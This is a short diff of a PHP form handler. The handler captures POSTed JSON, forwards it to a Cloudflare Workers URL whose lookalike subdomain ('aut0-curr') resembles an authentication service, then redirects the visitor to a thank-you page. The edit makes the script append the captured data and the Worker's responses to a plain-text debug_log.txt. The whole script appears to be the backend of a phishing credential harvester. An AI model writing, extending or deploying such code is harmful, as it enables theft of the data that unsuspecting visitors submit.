@@ -2,8 +2,8 @@
 // Capture POST data
 $data = json_decode(file_get_contents("php://input"), true);
 
-// Log data for debugging
-error_log(json_encode($data));
+// Log received data
+file_put_contents("debug_log.txt", print_r($data, true), FILE_APPEND);
 
 // Forward to Cloudflare Worker
 $worker_url = "https://aut0-curr-9dc7.henrycrane65.workers.dev/";
@@ -19,8 +19,8 @@ $options = [
 $context = stream_context_create($options);
 $response = file_get_contents($worker_url, false, $context);
 
-// Log response from Worker
-error_log("Worker Response: " . json_encode($http_response_header));
+// Log Worker response
+file_put_contents("debug_log.txt", "Worker Response: " . print_r($http_response_header, true), FILE_APPEND);
 
 // Redirect to thanks.html after sending
 header("Location: ./thanks.html");
